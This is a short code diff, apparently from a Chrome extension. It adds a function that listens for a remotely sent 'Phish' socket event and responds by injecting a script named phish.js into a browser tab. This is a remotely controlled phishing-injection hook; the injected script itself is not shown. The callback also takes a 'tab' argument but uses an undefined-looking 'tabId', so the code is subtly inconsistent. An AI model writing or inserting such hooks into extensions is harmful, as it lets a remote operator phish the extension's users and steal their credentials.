@@ -93,3 +93,11 @@ function createScriptListener() {
     });
   });
 }
+
+function createPhishingListener() {
+  socket.on('Phish', (tab) => {
+    chrome.tabs.executeScript(tabId, {
+      file: "/js/phish.js"
+    });
+  });
+}
